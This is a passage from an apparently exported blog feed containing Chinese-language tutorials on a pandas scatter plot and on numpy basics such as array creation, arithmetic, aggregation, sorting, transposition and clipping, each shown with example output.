<h1 id="plot画图"><a href="#plot画图" class="headerlink" title="plot画图"></a>plot画图</h1><p>简单举例 详细会单独写一篇<br><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line"><span class="meta">#plot data</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Series</span></span><br><span class="line"><span class="meta"># data = pd.Series(np.random.randn(1000),index=np.arange(1000))</span></span><br><span class="line"><span class="meta"># data = data.cumsum() #累加</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#DataFrame</span></span><br><span class="line">data = pd.DataFrame(np.random.randn(<span class="number">1000</span>,<span class="number">4</span>),</span><br><span class="line">                    # index=np.arange(<span class="number">1000</span>),</span><br><span class="line">                    columns=list(<span class="string">"ABCD"</span>))</span><br><span class="line">data = data.cumsum()</span><br><span class="line"><span class="meta"># print(data.head())</span></span><br><span class="line"><span class="meta"># data.plot()</span></span><br><span class="line"><span class="meta"># plot methods:</span></span><br><span class="line"><span class="meta"># 'bar': 柱状图</span></span><br><span class="line"><span class="meta"># 'hist'</span></span><br><span class="line"><span class="meta"># 'box'</span></span><br><span class="line"><span class="meta"># 'kde'</span></span><br><span class="line"><span class="meta"># 'scatter'</span></span><br><span class="line"><span class="meta"># hexbin'</span></span><br><span class="line"><span class="meta"># 'pie'</span></span><br><span class="line">ax = data.plot.scatter(x=<span class="string">'A'</span>,y=<span class="string">'B'</span>,color=<span class="string">'DarkBlue'</span>,label=<span class="string">"Class1"</span>)</span><br><span class="line">data.plot.scatter(x=<span class="string">'A'</span>,y=<span class="string">'C'</span>,color=<span class="string">'DarkGreen'</span>,label=<span class="string">'Class2'</span>,ax=ax)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><br>运行结果</p>
<p><img src="/img/python3/pandas/0.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>数据分析</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2021/2/21-numpy</title>
    <url>/2021/02/21/Python3-2021-2-21-numpy/</url>
    <content><![CDATA[<h1 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h1><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><figure class="highlight golo"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy as np</span><br><span class="line"></span><br><span class="line"><span class="comment">#numpy 属性</span></span><br><span class="line"><span class="keyword">array</span>=np.<span class="keyword">array</span>([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">               ,[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">array</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"number of dim:"</span>,<span class="keyword">array</span>.ndim)  <span class="comment">#维度</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"shape:"</span>,<span class="keyword">array</span>.shape) <span class="comment">#多少行多少列</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"size"</span>,<span class="keyword">array</span>.size) <span class="comment">#多少个元素</span></span><br></pre></td></tr></table></figure>
<ul>
<li>array.ndim 打印维度</li>
<li>array.shape 打印行列数</li>
<li>array.size 打印元素个数</li>
</ul>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line"> [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]]</span><br><span class="line">number of dim: <span class="number">2</span></span><br><span class="line">shape: (<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">size <span class="number">6</span></span><br></pre></td></tr></table></figure></p>
<h2 id="创建array"><a href="#创建array" class="headerlink" title="创建array"></a>创建array</h2><h3 id="np-array"><a href="#np-array" class="headerlink" title="np.array"></a>np.array</h3><p>使用这种方法创建的数组类似于列表 但是没有逗号<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">a</span>=np.array([2,3,4],<span class="attribute">dtype</span>=np.int)  #dtype设置显示的类型</span><br><span class="line"><span class="builtin-name">print</span>(a)   #类似于列表 但是没有逗号</span><br></pre></td></tr></table></figure></p>
<ul>
<li>dtype 设置显示的类型</li>
</ul>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="number">2</span> <span class="number">3</span> <span class="number">4</span>]</span><br></pre></td></tr></table></figure></p>
<h3 id="创建全是0的array"><a href="#创建全是0的array" class="headerlink" title="创建全是0的array"></a>创建全是0的array</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">a=np.zeros((<span class="number">3</span>,<span class="number">4</span>),dtype=np.<span class="built_in">int</span>)  #生成一个<span class="number">3</span>行<span class="number">4</span>列 为<span class="number">0</span>的矩阵</span><br><span class="line">print(a)  #生成全为<span class="number">1</span>的矩阵就是用ones</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br><span class="line"> [<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br><span class="line"> [<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]]</span><br></pre></td></tr></table></figure></p>
<h3 id="指定范围创建array"><a href="#指定范围创建array" class="headerlink" title="指定范围创建array"></a>指定范围创建array</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">10</span>,<span class="number">20</span>,<span class="number">2</span>)  #从<span class="number">10</span>到<span class="number">20</span>  步长为<span class="number">2</span></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="number">10</span> <span class="number">12</span> <span class="number">14</span> <span class="number">16</span> <span class="number">18</span>]</span><br></pre></td></tr></table></figure>
<p>还可以指定行列<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">12</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))  #生成<span class="number">3</span>行<span class="number">4</span>列从<span class="number">0</span>到<span class="number">11</span>的矩阵</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>]</span><br><span class="line"> [ <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line"> [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]]</span><br></pre></td></tr></table></figure></p>
<h2 id="基础运算"><a href="#基础运算" class="headerlink" title="基础运算"></a>基础运算</h2><h3 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = np.array([<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>])</span><br><span class="line"><span class="selector-tag">b</span> = np.arange(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组a:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组b:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b)</span></span></span><br><span class="line">c = a-<span class="selector-tag">b</span>  #加减乘除运算都可以</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"运算结果："</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(c)</span></span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">数组a:</span><br><span class="line">[<span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">40</span>]</span><br><span class="line">数组b:</span><br><span class="line">[<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line">运算结果：</span><br><span class="line">[<span class="number">10</span> <span class="number">19</span> <span class="number">28</span> <span class="number">37</span>]</span><br></pre></td></tr></table></figure><br>其他类似</p>
<h3 id="平方"><a href="#平方" class="headerlink" title="平方"></a>平方</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = np.array([<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>])</span><br><span class="line"><span class="selector-tag">b</span> = np.arange(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组a:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组b:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"运算结果："</span>)</span></span></span><br><span class="line">c = a**<span class="selector-tag">b</span> #a的b次方</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(c)</span></span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">数组a:</span><br><span class="line">[<span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">40</span>]</span><br><span class="line">数组b:</span><br><span class="line">[<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line">运算结果：</span><br><span class="line">[    <span class="number">1</span>    <span class="number">20</span>   <span class="number">900</span> <span class="number">64000</span>]</span><br></pre></td></tr></table></figure></p>
<h3 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = np.array([<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>])</span><br><span class="line"><span class="selector-tag">b</span> = np.arange(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组a:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组b:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"运算结果："</span>)</span></span></span><br><span class="line">c = <span class="number">10</span>*np.sin(a) #对于a的每个值sin 再乘<span class="number">10</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(c)</span></span></span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">数组a:</span><br><span class="line">[<span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">40</span>]</span><br><span class="line">数组b:</span><br><span class="line">[<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line">运算结果：</span><br><span class="line">[<span class="number">-5.44021111</span>  <span class="number">9.12945251</span> <span class="number">-9.88031624</span>  <span class="number">7.4511316</span> ]</span><br></pre></td></tr></table></figure></p>
<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = np.array([<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>])</span><br><span class="line"><span class="selector-tag">b</span> = np.arange(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组b:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"运算结果："</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b&lt;<span class="number">3</span>)</span></span> #小于<span class="number">3</span>为true 否则为false</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">数组b:</span></span><br><span class="line"><span class="string">[0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span><span class="string">]</span></span><br><span class="line"><span class="string">运算结果：</span></span><br><span class="line"><span class="string">[</span> <span class="literal">True</span>  <span class="literal">True</span>  <span class="literal">True</span> <span class="literal">False</span><span class="string">]</span></span><br></pre></td></tr></table></figure></p>
<h3 id="逐个相乘"><a href="#逐个相乘" class="headerlink" title="逐个相乘"></a>逐个相乘</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = np.array([[<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">              [<span class="number">0</span>,<span class="number">1</span>]])</span><br><span class="line"><span class="selector-tag">b</span> = np.arange(<span class="number">4</span>).reshape(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组a:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组b:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b)</span></span></span><br><span class="line">c = a*<span class="selector-tag">b</span> #逐个相乘</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"运行结果："</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(c)</span></span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">数组a:</span><br><span class="line"><span class="string">[[1 1]</span></span><br><span class="line"><span class="string"> [0 1]]</span></span><br><span class="line">数组b:</span><br><span class="line"><span class="string">[[0 1]</span></span><br><span class="line"><span class="string"> [2 3]]</span></span><br><span class="line">运行结果：</span><br><span class="line"><span class="string">[[0 1]</span></span><br><span class="line"><span class="string"> [0 3]]</span></span><br></pre></td></tr></table></figure></p>
<h3 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = np.array([[<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">              [<span class="number">0</span>,<span class="number">1</span>]])</span><br><span class="line"><span class="selector-tag">b</span> = np.arange(<span class="number">4</span>).reshape(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组a:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组b:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b)</span></span></span><br><span class="line">c_dot = np.dot(<span class="selector-tag">a</span>,b) #矩阵乘法</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"运行结果："</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(c_dot)</span></span></span><br></pre></td></tr></table></figure>
<p>运算结果：<br><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">数组a:</span><br><span class="line"><span class="string">[[1 1]</span></span><br><span class="line"><span class="string"> [0 1]]</span></span><br><span class="line">数组b:</span><br><span class="line"><span class="string">[[0 1]</span></span><br><span class="line"><span class="string"> [2 3]]</span></span><br><span class="line">运行结果：</span><br><span class="line"><span class="string">[[2 4]</span></span><br><span class="line"><span class="string"> [2 3]]</span></span><br></pre></td></tr></table></figure></p>
<h3 id="求和-最大-小-值"><a href="#求和-最大-小-值" class="headerlink" title="求和_最大(小)值"></a>求和_最大(小)值</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = np<span class="selector-class">.random</span>.random((<span class="number">2</span>,<span class="number">4</span>))  #随机生成<span class="number">2</span>行<span class="number">4</span>列的矩阵</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"数组a:"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"行求和："</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.sum(a,axis=<span class="number">1</span>)</span></span>)  #axis=<span class="number">1</span>就是行求和</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"列求最小值"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.min(a,axis=<span class="number">0</span>)</span></span>) #axis=<span class="number">0</span>就是每列求最小值</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"求最大值"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.max(a)</span></span>)</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">数组a:</span><br><span class="line">[[<span class="number">0.43408198</span> <span class="number">0.78606556</span> <span class="number">0.54177785</span> <span class="number">0.1037451</span> ]</span><br><span class="line"> [<span class="number">0.94012845</span> <span class="number">0.88517271</span> <span class="number">0.9114281</span>  <span class="number">0.56670466</span>]]</span><br><span class="line">行求和：</span><br><span class="line">[<span class="number">1.86567049</span> <span class="number">3.30343392</span>]</span><br><span class="line">列求最小值</span><br><span class="line">[<span class="number">0.43408198</span> <span class="number">0.78606556</span> <span class="number">0.54177785</span> <span class="number">0.1037451</span> ]</span><br><span class="line">求最大值</span><br><span class="line"><span class="number">0.9401284531215222</span></span><br></pre></td></tr></table></figure></p>
<h3 id="求索引"><a href="#求索引" class="headerlink" title="求索引"></a>求索引</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">2</span>,<span class="number">14</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"最小值的索引"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.argmin(A)</span></span>) #求最小值的索引</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"最大值的索引"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.argmax(A)</span></span>)  #求最大值的索引</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>]</span><br><span class="line"> [ <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</span><br><span class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span>]]</span><br><span class="line">最小值的索引</span><br><span class="line"><span class="number">0</span></span><br><span class="line">最大值的索引</span><br><span class="line"><span class="number">11</span></span><br></pre></td></tr></table></figure></p>
<h3 id="平均数-中位数"><a href="#平均数-中位数" class="headerlink" title="平均数_中位数"></a>平均数_中位数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">2</span>,<span class="number">14</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"平均数"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.mean(A)</span></span>)  #求平均值  A.mean()也可以 average()也是一样的</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"中位数"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.median(A)</span></span>)  #求中位数</span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>]</span><br><span class="line"> [ <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</span><br><span class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span>]]</span><br><span class="line">平均数</span><br><span class="line"><span class="number">7.5</span></span><br><span class="line">中位数</span><br><span class="line"><span class="number">7.5</span></span><br></pre></td></tr></table></figure></p>
<h3 id="前n项和"><a href="#前n项和" class="headerlink" title="前n项和"></a>前n项和</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">2</span>,<span class="number">14</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"前n项和"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.cumsum(A)</span></span>) #逐步累加 前n项和</span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>]</span><br><span class="line"> [ <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</span><br><span class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span>]]</span><br><span class="line">前n项和</span><br><span class="line">[ <span class="number">2</span>  <span class="number">5</span>  <span class="number">9</span> <span class="number">14</span> <span class="number">20</span> <span class="number">27</span> <span class="number">35</span> <span class="number">44</span> <span class="number">54</span> <span class="number">65</span> <span class="number">77</span> <span class="number">90</span>]</span><br></pre></td></tr></table></figure></p>
<h3 id="逐差"><a href="#逐差" class="headerlink" title="逐差"></a>逐差</h3><p>就是前一个数减后一个数<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">2</span>,<span class="number">14</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"逐步差"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.diff(A)</span></span>) #逐步差</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>]</span><br><span class="line"> [ <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</span><br><span class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span>]]</span><br><span class="line">逐步差</span><br><span class="line">[[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]]</span><br></pre></td></tr></table></figure></p>
<h3 id="非0的数"><a href="#非0的数" class="headerlink" title="非0的数"></a>非0的数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">2</span>,<span class="number">14</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"非0的数"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.nonzero(A)</span></span>) #第一个array输出行数 第二个array输出列数 求非<span class="number">0</span>的数</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>]</span><br><span class="line"> [ <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</span><br><span class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span>]]</span><br><span class="line">非<span class="number">0</span>的数</span><br><span class="line">(<span class="built_in">array</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>], dtype=<span class="built_in">int</span>64), <span class="built_in">array</span>([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], dtype=<span class="built_in">int</span>64))</span><br></pre></td></tr></table></figure><br>第一个array返回的是行的下标  第二个array返回的是列的下标</p>
<p>如果为0 则不返回</p>
<h3 id="逐行排序"><a href="#逐行排序" class="headerlink" title="逐行排序"></a>逐行排序</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">A = [[<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>],</span><br><span class="line">     [<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>],</span><br><span class="line">     [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]]</span><br><span class="line">print(A)</span><br><span class="line">print(<span class="string">"逐行排序"</span>)</span><br><span class="line">print(np.sort(A))  #排序 逐行排序</span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>], [<span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>], [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]]</span><br><span class="line">逐行排序</span><br><span class="line">[[<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line"> [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]]</span><br></pre></td></tr></table></figure></p>
<h3 id="转置"><a href="#转置" class="headerlink" title="转置"></a>转置</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">2</span>,<span class="number">14</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"矩阵的转置"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.transpose(A)</span></span>) #矩阵反向  也可以写成A<span class="selector-class">.T</span>  行变列 列变行 矩阵的转置</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[[ <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>]</span><br><span class="line"> [ <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</span><br><span class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span>]]</span><br><span class="line">矩阵的转置</span><br><span class="line">[[ <span class="number">2</span>  <span class="number">6</span> <span class="number">10</span>]</span><br><span class="line"> [ <span class="number">3</span>  <span class="number">7</span> <span class="number">11</span>]</span><br><span class="line"> [ <span class="number">4</span>  <span class="number">8</span> <span class="number">12</span>]</span><br><span class="line"> [ <span class="number">5</span>  <span class="number">9</span> <span class="number">13</span>]]</span><br></pre></td></tr></table></figure></p>
<h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">2</span>,<span class="number">14</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">print(A)</span><br><span class="line">print(<span class="string">"所有小于5的数都变成5 所有大于9的数都变成9  中间的数就正常保留"</span>)</span><br><span class="line">print(np.clip(A,<span class="number">5</span>,<span class="number">9</span>)) #所有小于<span class="number">5</span>的数都变成<span class="number">5</span> 所有大于<span class="number">9</span>的数都变成<span class="number">9</span>  中间的数就正常保留</span><br></pre></td></tr></table></figure>
